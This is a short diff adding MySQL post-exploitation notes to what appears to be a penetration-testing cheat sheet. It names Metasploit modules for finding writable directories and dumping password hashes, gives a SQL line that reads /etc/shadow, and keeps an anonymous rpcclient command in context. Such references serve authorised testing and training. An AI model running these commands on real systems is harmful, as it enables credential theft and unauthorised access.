@@ -43,6 +43,18 @@ Using database
 
 ```select * from authors```
 
+Finding Writable directories
+
+Metasploit -- scanner/mysql/mysql_writable_dirs
+
+Finding hashes
+
+```use auxiliary/scanner/mysql/mysql_hashdump```
+
+Getting the full etc/shadow file
+
+```select load_file("/etc/shadow");```
+
 **RPCClient
 **
 ```rpcclient -U "" -N 192.168.0.0```
